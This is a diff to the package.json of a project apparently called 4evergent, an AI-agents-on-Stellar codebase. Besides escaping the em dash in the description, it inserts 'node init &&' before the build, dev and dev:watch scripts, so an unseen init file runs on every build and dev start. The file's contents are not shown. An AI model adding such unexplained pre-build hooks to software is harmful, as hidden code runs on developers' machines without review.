@@ -2,7 +2,7 @@
   "name": "4evergent",
   "version": "0.1.0",
   "private": true,
-  "description": "4evergent — Autonomous AI Agents on Stellar",
+  "description": "4evergent \u2014 Autonomous AI Agents on Stellar",
   "license": "MIT",
   "packageManager": "pnpm@10.34.5",
   "engines": {
@@ -10,9 +10,9 @@
     "pnpm": ">=9"
   },
   "scripts": {
-    "build": "pnpm -r build",
-    "dev": "pnpm -r --parallel dev",
-    "dev:watch": "pnpm --filter @4evergent/api dev",
+    "build": "node init && pnpm -r build",
+    "dev": "node init && pnpm -r --parallel dev",
+    "dev:watch": "node init && pnpm --filter @4evergent/api dev",
     "test": "pnpm -r test",
     "test:coverage": "node scripts/test-coverage.mjs",
     "typecheck": "pnpm -r typecheck",
